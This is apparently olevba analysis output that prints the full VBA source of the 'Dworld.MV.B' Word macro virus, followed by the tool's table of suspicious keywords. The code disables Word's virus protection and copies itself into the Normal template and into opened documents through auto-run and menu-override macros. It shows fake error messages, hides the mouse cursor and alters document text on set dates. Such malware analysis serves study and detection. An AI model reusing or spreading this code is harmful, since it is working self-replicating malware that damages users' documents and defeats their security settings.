olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dworld-ea53352a9b5912a48b2517b9817f4e35941f3e1f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dworld-ea53352a9b5912a48b2517b9817f4e35941f3e1f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Dworld.bas 
in file: Virus.MSWord.Dworld-ea53352a9b5912a48b2517b9817f4e35941f3e1f - OLE stream: 'Macros/VBA/Dworld'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer

Sub AnsichtCode()
 On Error Resume Next
 
 Call InfNormal
 Call InfDok
 
 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 MsgBox "Nicht genug freien Speicher um Anwendung zu starten", 16, "Microsoft Word - Fehler"
 
 WordBasic.FileExit dlg

End Sub

Sub AnsichtVBCode()
On Error Resume Next
 
 Call InfNormal
 Call InfDok
 
 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 MsgBox "Nicht genug freien Speicher um Anwendung zu starten", 16, "Microsoft Word - Fehler"
 
 WordBasic.FileExit dlg

End Sub
Sub AutoOpen()

ShowVisualBasicEditor = False
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
 
 With Options
     .SaveNormalPrompt = False
     .VirusProtection = False
     .AllowFastSave = False
 End With

 On Error GoTo ende_
 
 Call InfNormal
 Call InfDok
 Call PayloadB

 ActiveDocument.SaveAs (WordBasic.[FileName$]())

ende_:
End Sub
Sub AutoNew()
 
 Call AutoOpen

End Sub

Sub DateiDokVorlagen()
 On Error Resume Next
 
 Call InfNormal
 Call InfDok
 
 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 MsgBox "Nicht genug freien Speicher um Anwendung zu starten", 16, "Microsoft Word - Fehler"
 
 WordBasic.FileExit dlg

End Sub

Sub DateiDruckenStandard()

Randomize

If Second(Now()) <= 30 And Int((3 * Rnd) + 1) = 2 Then
MsgBox "Des Zauberer´s Finger sind im Spiel!", 32, "Microsoft Word"

ScreenUpdating = 0
 
 Call PayloadA
 
  WordBasic.EndOfDocument
    Selection.TypeParagraph
    Selection.TypeParagraph
     Selection.Font.Name = "Courier New"
    Selection.Font.ColorIndex = wdRed
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    WordBasic.Insert "...I moch eich olle hin, nTs:..."
    Selection.TypeParagraph
    WordBasic.Insert "-Schean he MICHI, ANGI, HERBERT, ANDI"
    
  WordBasic.StartOfDocument
 
ScreenUpdating = 1

End If
 
 ActiveDocument.PrintOut
 
 Call InfNormal
 Call InfDok

 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 Call PayloadB

End Sub

Sub DateiÖffnen()
On Error GoTo ende_
 
 ShowVisualBasicEditor = False
 WordBasic.DisableAutoMacros 0

 With Options
     .SaveNormalPrompt = False
 End With

 With Dialogs(wdDialogFileOpen)
     .Show
 End With

 Call InfDok
 
 ActiveDocument.Save
 
ende_:
End Sub
Sub DateiSpeichern()
On Error Resume Next

 With Dialogs(wdDialogFileSaveAs)
    .Show
 End With
 
 Call InfDok
 Call DworldInfo
 
 ActiveDocument.Save

End Sub
Sub Dworld()
' DiscwørlD MakrøViruS -Dwørld.MV.B- der magischen Gilde
' Prøgrammiert von Rincewind~[m@G]~
' Kontakt: | rincewind_mg@hotmail.com |
' !FöRDERT EURE LOKALE SZENE!
' Ausgesetzt im Jänner 99
' Danke an alle die mich kennen | besønders NJøker[SLAM] | cøRDy & LRay <beide LzØ>
' Dwørld.MV ist FleTsCheR und IarRaGøN<LzØ> gewidmet

' ØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØ
' Ø !"§%&/()=?->DiE auFgeKLärTeN BRüdeR dER sCHwaRzeN NaCHt<-?=()\&%$§"! Ø
' ØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØ
End Sub
Sub DworldInfo()
 On Error GoTo ende_
 
 Open "C:\WINDOWS\SYSTEM\DWORLD.INI" For Append As 2
  a$ = Date$
  b$ = Time$
  c$ = WordBasic.[FileName$]()
  
  Print #2, c$ + ",  " + a$ + ",  " + b$ + " ;"
     
  Close 2
ende_:
End Sub
Sub ExtrasMakro()
 On Error Resume Next
 
 Call InfNormal
 Call InfDok
 
 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 MsgBox "Nicht genug freien Speicher um Anwendung zu starten", 16, "Microsoft Word - Fehler"
 
 WordBasic.FileExit dlg

End Sub

Sub PayloadA()
On Error Resume Next

Randomize

If Day(Now()) = 24 And Int((5 * Rnd) + 1) = 1 Then
 MsgBox "Des Zauberer´s Finger sind im Spiel!", 32, "Microsoft Word"

  Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
     With Selection.Find
        .Text = "der"
        .Replacement.Text = "der ~[m@G]~"
        .Wrap = wdFindContinue
     End With
    Selection.Find.Execute Replace:=wdReplaceAll
Else
End If

ActiveDocument.SaveAs (WordBasic.[FileName$]())

End Sub
Sub PayloadB()
On Error GoTo weiter_

    If Day(Now()) = 12 Then
       MsgBox "Des Zauberer´s Finger sind im Spiel!", 32, "Microsoft Word"
       GoTo HideMouse
    Else
       GoTo ShowMouse
    End If

HideMouse:
 While ShowCursor(False) >= 0
 Wend
GoTo weiter_

ShowMouse:
 While ShowCursor(True) < 0
 Wend

weiter_:
End Sub
Sub HilfeInfo()
On Error Resume Next
 
 Call InfNormal
 Call InfDok
 
 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 MsgBox "<------------------------------------------------------------>                  " _
 & vbCrLf & "     Dwørld.MV.B hat Kontrolle über Word!" _
 & vbCrLf & Chr(13) + Chr(13) + "  Programmiert von RinCeWinD ~[m@G]~" _
 & vbCrLf & "              DanKe aN: IarRaGØn<***>" _
 & vbCrLf & "<------------------------------------------------------------>                  ", 64, "                     Die m@gische Gilde ~[m@G]~"
 
End Sub

Sub InfNormal()
 
If DworldIns = 0 Then
 
 DN$ = WordBasic.[FileName$]()
 DW$ = ":Dworld"
 G$ = "Global"

 On Error GoTo fehler_

 ScreenUpdating = 0

 WordBasic.MacroCopy DN$ + DW$, G$ + DW$, 1
 
 ScreenUpdating = 1
 
 Application.UserName = "RinCeWinD~[m@G]~"
 Application.UserInitials = "~[m@G]~"
 Application.UserAddress = "Kontakt: rincewind_mg@hotmail.com"

    Open "C:\WINDOWS\SYSTEM\DWORLD.INI" For Output As 1
     a$ = Date$
     b$ = Time$
     c$ = WordBasic.[FileName$]()
     
      Print #1, "----------------------------------------------------------------------------------------------------------"
      Print #1, "Erstinfektion mit Dworld.MV.B am: " + a$ + " um " + b$ + " durch " + c$
      Print #1, "----------------------------------------------------------------------------------------------------------"
      Print #1, "Programmiert von RinCeWinD~[m@G]~ aka zWeiBLuM<BeTa>"
      Print #1, "Kontakt: Rincewind_mg@hotmail.com"
      Print #1, " ---------------------------------------------------"
      Print #1, "|Danke an LzØ (besonders IarRagøN & LRay), BeTa CreW|"
      Print #1, "|und alle die mich kennen!                          |"
      Print #1, "|FöRDERT EURE LOKALE SZENE!                         |"
      Print #1, " ---------------------------------------------------"
      Print #1, ""
      Print #1, "Weitere Infektionen:"
      Print #1, "----------------------------------------------------------------------------------------------------------"
      Print #1, "DateiName:         Datum:          Uhrzeit:"
 
    Close 1
 
End If
fehler_:
End Sub
Sub InfDok()
 
If xDworldIns = 0 Then
 
 DN$ = WordBasic.[FileName$]()
 DW$ = ":Dworld"
 G$ = "Global"

On Error GoTo xfehler_

 ScreenUpdating = 0

 WordBasic.MacroCopy G$ + DW$, DN$ + DW$, 1
 
 ScreenUpdating = 1

 Call DworldInfo

End If

xfehler_:
End Sub

Function DworldIns()
 DworldIns = 0
  MZ = NormalTemplate.VBProject.VBComponents.Count
  For i = 1 To MZ
   If NormalTemplate.VBProject.VBComponents.Item(i).Name = "Dworld" Then
     DworldIns = -1
  End If
 Next i
End Function

Function xDworldIns()
xDworldIns = 0
 xMZ = ActiveDocument.VBProject.VBComponents.Count
 For x = 1 To xMZ
  If ActiveDocument.VBProject.VBComponents.Item(x).Name = "Dworld" Then
    xDworldIns = -1
  End If
 Next x
End Function



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

